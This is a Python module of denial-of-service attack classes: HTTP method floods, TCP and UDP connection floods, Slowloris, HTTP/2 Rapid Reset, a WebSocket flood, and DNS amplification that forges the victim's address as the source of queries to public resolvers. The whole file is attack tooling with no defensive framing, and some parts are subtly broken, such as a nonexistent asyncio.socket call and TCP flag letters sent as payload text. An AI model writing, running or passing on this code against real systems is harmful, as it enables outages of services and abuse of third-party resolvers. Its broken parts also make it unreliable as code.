import socket
import random
import string
import asyncio
import aiohttp
import h2.config
import h2.connection
from typing import Optional, Dict, List
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime, timedelta
from scapy.all import IP, TCP, UDP, ICMP, send
from .utilities import NetworkUtilities, Endpoint
import base64


# Utility function to decode Base64 strings
def _decode_str(encoded: str) -> str:
    return base64.b64decode(encoded).decode("utf-8")


class L7Async:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._session: Optional[aiohttp.ClientSession] = None

    def _generate_data_content(self, length: int = 256) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            timeout = aiohttp.ClientTimeout(total=10, connect=5)
            connector = aiohttp.TCPConnector(limit=0, limit_per_host=100)
            self._session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self._session

    async def _send_request(self, method: str) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                session = await self._get_session()
                url = f"{self.endpoint.scheme}://{self.endpoint.host}:{self.endpoint.port}{self.endpoint.path}"

                headers = {
                    "User-Agent": self.net_tools.random_user_agent(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                }

                if method in ("POST", "PUT"):
                    body = self._generate_data_content(256)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    headers["Content-Length"] = str(len(body))
                else:
                    body = None

                async with session.request(
                    method, url, headers=headers, data=body, ssl=False
                ) as resp:
                    await resp.read()

            except asyncio.TimeoutError:
                pass
            except aiohttp.ClientError:
                pass
            except Exception:
                pass

            if (self.until - datetime.now()).total_seconds() <= 0:
                break
            await asyncio.sleep(0.01)

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()

    def GET(self) -> None:
        asyncio.create_task(self._send_request("GET"))

    def POST(self) -> None:
        asyncio.create_task(self._send_request("POST"))

    def PUT(self) -> None:
        asyncio.create_task(self._send_request("PUT"))

    def DELETE(self) -> None:
        asyncio.create_task(self._send_request("DELETE"))

    def HEAD(self) -> None:
        asyncio.create_task(self._send_request("HEAD"))


class L4Async:
    def __init__(self, endpoint, duration: int):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _send_tcp_async(self, flags: str = None) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port
                )
                if flags:
                    writer.write(flags.encode())
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _send_udp_async(self, message: bytes) -> None:
        sock = asyncio.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while (self.until - datetime.now()).total_seconds() > 0:
                try:
                    sock.sendto(message, (self.endpoint.host, self.endpoint.port))
                except Exception:
                    pass
        finally:
            sock.close()

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def ACK(self) -> None:
        self._run_async(self._send_tcp_async("A"))

    def SYN(self) -> None:
        self._run_async(self._send_tcp_async("S"))

    def FIN(self) -> None:
        self._run_async(self._send_tcp_async("F"))

    def RST(self) -> None:
        self._run_async(self._send_tcp_async("R"))

    def TCP(self) -> None:
        self._run_async(self._send_tcp_async())

    def UDP(self, message: bytes = b"hello") -> None:
        self._run_async(self._send_udp_async(message))

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class Slowloris:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []
        self._sockets: List[socket.socket] = []

    def _generate_headers(self) -> bytes:
        host = self.endpoint.host
        port = self.endpoint.port
        headers = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {self.net_tools.random_user_agent()}\r\n"
            f"Accept: */*\r\n"
            f"X-A: "
        )
        return headers.encode()

    async def _send_slowloris(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sockets.append(sock)
        try:
            sock.settimeout(5)
            await asyncio.get_event_loop().sock_connect(
                sock, (self.endpoint.host, self.endpoint.port)
            )

            headers = self._generate_headers()
            await asyncio.get_event_loop().sock_sendall(sock, headers)

            while (self.until - datetime.now()).total_seconds() > 0:
                try:
                    await asyncio.sleep(10)
                    partial = (
                        b"X-Keep-Alive: "
                        + str(random.randint(1, 9999)).encode()
                        + b"\r\n"
                    )
                    await asyncio.get_event_loop().sock_sendall(sock, partial)
                except Exception:
                    break
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._send_slowloris())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)
        for sock in self._sockets:
            try:
                sock.close()
            except Exception:
                pass


class H2RapidReset:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _rapid_reset_raw(self) -> None:
        import ssl

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port, ssl=ssl_ctx
                )

                http2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
                writer.write(http2_preface)
                await writer.drain()

                conn = h2.connection.H2Connection(
                    config=h2.config.H2Configuration(client_side=True)
                )
                conn.initiate_connection()
                writer.write(conn.data_to_send())
                await writer.drain()

                conn.send_headers(
                    1,
                    [
                        (b":method", b"GET"),
                        (b":path", b"/"),
                        (b":scheme", b"https"),
                        (
                            b":authority",
                            f"{self.endpoint.host}:{self.endpoint.port}".encode(),
                        ),
                    ],
                )
                conn.reset_stream(1)

                data = conn.data_to_send()
                if data:
                    writer.write(data)
                    await writer.drain()

                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._rapid_reset_raw())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class DNSAmplification:
    def __init__(self, target_host: str, target_port: int = 53, duration: int = 30):
        self.target_host = target_host
        self.target_port = target_port
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

        self._resolvers = [
            ("8.8.8.8", 53),
            ("1.1.1.1", 53),
            ("9.9.9.9", 53),
            ("208.67.222.222", 53),
        ]

    async def _send_dns_amp(self) -> None:
        from scapy.all import IP, UDP, DNS, DNSQR, send

        query_type = random.choice(["A", "AAAA", "MX", "TXT", "CNAME"])
        domain = f"{random.randint(1, 999999)}.example.com"

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                resolver_ip, resolver_port = random.choice(self._resolvers)

                pkt = (
                    IP(src=self.target_host, dst=resolver_ip)
                    / UDP(sport=random.randint(1024, 65535), dport=resolver_port)
                    / DNS(rd=1, qd=DNSQR(qname=domain, qtype=query_type))
                )
                send(pkt, verbose=0)
            except Exception:
                pass

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._send_dns_amp())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class WebSocketFlood:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _ws_flood(self) -> None:
        import aiohttp

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                ws_url = f"ws://{self.endpoint.host}:{self.endpoint.port}/ws"
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, timeout=5) as ws:
                        for _ in range(10):
                            if (self.until - datetime.now()).total_seconds() <= 0:
                                break
                            msg = (
                                self.net_tools._generate_data_content(256)
                                if hasattr(self.net_tools, "_generate_data_content")
                                else "x" * 256
                            )
                            await ws.send_str(msg)
                            await asyncio.sleep(0.1)
            except Exception:
                pass

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._ws_flood())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)
